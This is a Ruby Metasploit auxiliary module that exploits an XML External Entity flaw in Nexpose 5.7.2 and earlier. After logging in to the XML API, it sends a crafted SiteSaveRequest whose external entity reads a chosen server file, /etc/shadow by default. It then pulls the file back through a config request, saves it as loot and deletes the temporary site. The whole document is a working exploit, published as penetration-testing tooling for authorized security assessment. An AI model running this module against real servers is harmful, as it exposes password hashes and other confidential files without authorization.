##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rapid7/nexpose'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'Nexpose XXE Arbitrary File Read',
			'Description' => %q{
				Nexpose v5.7.2 and prior was vulnerable to a XML External Entity attack via a few vectors.
				This allowed an attacker to craft special XML that read arbitrary files from the filesystem.
				This module exploits the vulnerability via the XML API.
			},
			'Author' =>
				[
					'bperry', #Discovery/Metasploit Module
					'bojanz'  #Independent discovery
				],
			'License' => MSF_LICENSE
		))

		register_options(
			[
				OptString.new('USERNAME', [true, "The Nexpose user", "user"]),
				OptString.new('PASSWORD', [true, "The Nexpose password", "pass"]),
				OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
			], self.class)
	end

	def run
		host = datastore['RHOST']
		port = datastore['RPORT']
		user = datastore['USERNAME']
		pass = datastore['PASSWORD']

		nsc = Nexpose::Connection.new(host, user, pass, port)

		print_status("Authenticating as: " << user)
		begin
			nsc.login
			report_auth_info(
				:host   => host,
				:port   => port,
				:sname  => 'https',
				:user   => user,
				:pass   => pass,
				:proof  => '',
				:active => true
			)

		rescue
			print_error("Error authenticating, check your credentials")
			return
		end

		xml = '<!DOCTYPE foo ['
		xml << '<!ELEMENT host ANY>'
		xml << '<!ENTITY xxe SYSTEM "file://' << datastore['FILEPATH'] << '">'
		xml << ']>'
		xml << '<SiteSaveRequest session-id="'

		xml << nsc.session_id

		xml << '">'
		xml << '<Site id="-1" name="fdsa" description="fdfdsa">'
		xml << '<Hosts>'
		xml << '<host>&xxe;</host>'
		xml << '</Hosts>'
		xml << '<Credentials />'
		xml << '<Alerting />'
		xml << '<ScanConfig configID="-1" name="fdsa" templateID="full-audit" />'
		xml << '</Site>'
		xml << '</SiteSaveRequest>'

		print_status("Sending payload")
		begin
			fsa = nsc.execute(xml)
		rescue
			print_error("Error executing API call for site creation, ensure the filepath is correct")
			return
		end

		doc = REXML::Document.new fsa.raw_response_data
		id = doc.root.attributes["site-id"]

		xml = "<SiteConfigRequest session-id='" << nsc.session_id << "' site-id='" << id << "' />"

		print_status("Retrieving file")
		begin
			fsa = nsc.execute(xml)
		rescue
			nsc.site_delete id
			print_error("Error retrieving the file.")
			return
		end

		doc = REXML::Document.new fsa.raw_response_data

		print_status("Cleaning up")
		begin
			nsc.site_delete id
		rescue
			print_error("Error while cleaning up site")
			return
		end

		if !doc.root.elements["//host"]
			print_error("No file returned. Either the server is patched or the file did not exist.")
			return
		end

		path = store_loot('nexpose.file','text/plain', host, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{host}")
		print_good("File saved to path: " << path)
	end
end
